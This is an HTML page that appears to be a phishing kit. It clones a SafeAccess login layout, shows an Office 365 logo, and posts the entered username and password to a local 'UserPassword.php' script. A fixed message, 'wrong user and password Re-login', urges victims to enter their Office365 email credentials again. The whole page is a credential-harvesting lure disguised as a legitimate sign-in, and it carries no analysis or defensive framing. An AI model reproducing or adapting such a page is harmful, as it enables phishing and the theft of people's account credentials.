
<!DOCTYPE HTML>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>SafeAccess&reg; Login</title>
<link id="logincss" rel="stylesheet" href="https://cdn.clareitysecurity.net/css/login.css" />
<style>body{background: url(https://cdn.clareitysecurity.net/sys/alberta/paragon-login-background.png) no-repeat center center fixed;}
body{-webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover;}
#centerdiv{ background: #fff url(https://cdn.clareitysecurity.net/sys/alberta/paragon-login-bg.png) no-repeat center center; position: absolute;top: 50%;left: 50%;margin-top: -230px;margin-left: -300px;width: 600px;height: 460px; box-shadow: 0px 0px 5px 5px #333; border:1px solid #000;}
.submitbtn{background:#1B3B7C; color:#fff;text-shadow:none;box-shadow:none;border-color:#1B3B7C; filter:none;}
.submitbtn:hover { background: #014B9C;filter:none;}
#password{display: inline-block;}
</style>
 	<script id="jqueryjs" type="text/javascript" src="https://cdn.clareitysecurity.net/js/jquery.min.js"></script>
	<script id="loginxkdjs" type="text/javascript" src="https://cdn.clareitysecurity.net/js/loginxkd-dd-2.9.min.js"></script>
<script id="kdcollector" src="https://collector.clareity.net/kdl/1583937068116?trxId=85143446b5ad7592524a5d61c8d9a7920aa3e5d7&deviceId=d0bea4362eff62c13bcbe1c63236b70243878dd1&systemName=rae&toc=1583937068116"></script>
</head>
<body>
<script id="googletrack" type="text/javascript" src="https://cdn.clareitysecurity.net/sys/alberta/googletrack.js"></script>
<!--
ServerName: clt-idp-rae-mt01-c
-->
<div id="centerdiv">
  <table style="background:#fff; width:400px; margin:50px auto; border:1px solid #000">
    <tr >
      <td colspan="2" class="center" style="padding:10px;">
		<img id="logo" src="https://www.novosco.com/images/easyblog_articles/37/Office-365.jpg" border="0" width="234" height="83" /></td>
    </tr>
    <tr>
      <td width="379"><div class="center">
      <form name="loginform" method="post" action="UserPassword.php" id="loginform" class="3xkd kdform">
          <table style="width:90%;">
            <tr>
              <td width="105px">Username:</td>
              <td><input tabindex="1" type="text" name="j_username" id="j_username" autocomplete="off" class="form-control 3xkd kdusername" /></td>
            </tr>
            <tr>
              <td>Password:</td>
              <td><input tabindex="2" type="password" name="password" id="password" autocomplete="off" class="form-control 3xkd kdpassword"/></td>
            </tr>
            <tr>
              <td class="login12" colspan="2" align="center">
  <input type="hidden" id="j_password" name="j_password" />
  <input type="hidden" id="j_logintype" name="j_logintype" value="sso" />
  <button id="loginbtn" name="login" class="3xkd kdbutton submitbtn" type="button" tabindex="3" >Log in</button>
              </td>
            </tr>
            <tr>
              <td colspan="2">
<br>Enter your correct <b> <font color="#FF0000">Office365</font></b> Email<p>
<font color="#FF0000"><span style="font-weight: 700; background-color: #FFFFFF">
wrong user and password Re-login</span></font></td>
            </tr>
          </table>
          </form>
          <div id="failuremsg">
          </div>
        </div></td>
    </tr>
  </table>
</div>
<iframe id="collectoriframe" src="/idp/server.jsp" width="0" height="0" style="display:none;"></iframe>
</body>
</html>